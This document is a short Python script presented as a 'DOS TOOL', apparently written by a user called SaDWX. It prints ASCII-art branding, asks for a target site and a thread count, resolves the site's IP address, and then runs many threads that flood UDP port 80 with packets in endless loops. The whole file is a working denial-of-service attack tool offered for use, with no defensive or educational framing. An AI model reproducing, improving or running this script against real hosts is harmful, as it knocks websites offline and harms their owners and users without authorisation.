#!/usr/bin/python
#DOS TOOL
#created by SaDWX
#kosnane editor code ro gayidam
import socket
import time
import sys
import os
import _thread
from colorama import Fore, Back, Style
os.system ('clear')
cyan = Fore.CYAN
red = Fore.RED
magenta = Fore.MAGENTA
lightgreen = Fore.LIGHTGREEN_EX
print(magenta+'''
    OboOOOOOOOOOOOOO.OOo. .oOOOOOo.    OOOo.oOOOOOo..OOOOOOOOOOO0   
    OOOOoOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOOOOOOOOOOOOOO00   
    `OOOOO     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO0    `OOOOo     
    .OOOO"            `OOOOOOOOOOOOOOOOOOOOOOOOOO"            `OO   
   OOOOO                 "OOOOOOOOOOOOOOOO"`                oOO     
   oOOOOOba.               .adOOOOOOOOOOba             .adOOOOo.    
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOOOOOOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  "OOOOOOOOOOOOO.OOOOOOOOOOOOOO  
 "OOOO"       "YOoOOOOMOIONODOO"`      "OOROAOPOEOOOoOY"     "OOO"  
    Y           "OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?"        :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                  0o  OOOOOOOOOOOOOOOOOOOOOOOOOO:
                      `$"  `OOOO `O"Y " `OOOO  o             .
    .                  .     OP"          : o     .
'''+lightgreen+'''
-------------------------------------------------------------------
×××××××××××××××××××××××××××××××SaDWX××××××××××××××××××××××××××××××
-------------------------------------------------------------------
''')
site = input(cyan+'Enter your site url'+red+'#==>>>')
thread_count = input(lightgreen+'Enter your thread'+red+'#==>>>')
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = '</SaDWX/>'
print(red+'UDP target'+lightgreen+'IP:', ip)
print(red+'UDP target'+lightgreen+'port:', UDP_PORT)
time.sleep(1)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(magenta+'packet Sent1'+red+'!')
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
